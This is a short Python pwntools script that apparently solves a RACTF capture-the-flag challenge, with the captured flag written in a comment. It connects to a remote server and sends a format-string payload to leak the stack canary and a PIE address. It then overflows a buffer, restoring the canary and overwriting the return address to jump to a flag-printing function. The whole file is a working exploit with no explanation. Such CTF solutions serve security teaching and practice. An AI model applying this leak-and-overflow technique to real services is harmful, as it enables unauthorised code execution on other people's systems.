#flag=ractf{B4k1ng_4_p1E!}
from pwn import *
target=remote('88.198.219.20',41133)
print(target.recvuntil("name?\n"))
payload="%11$p%15$p"
target.sendline(payload)
print(target.recvuntil("you, "))
leak=target.recv()
canary=int(leak[0:10],16)
pieleak=int(leak[10:20],16)
print(hex(canary))
print(hex(pieleak))
pie_base=pieleak-0x13d9
payload="A"*25
payload+=p32(canary)
payload+="A"*12
flag=0x1209
payload+=p32(pie_base+flag)
target.sendline(payload)
target.interactive()

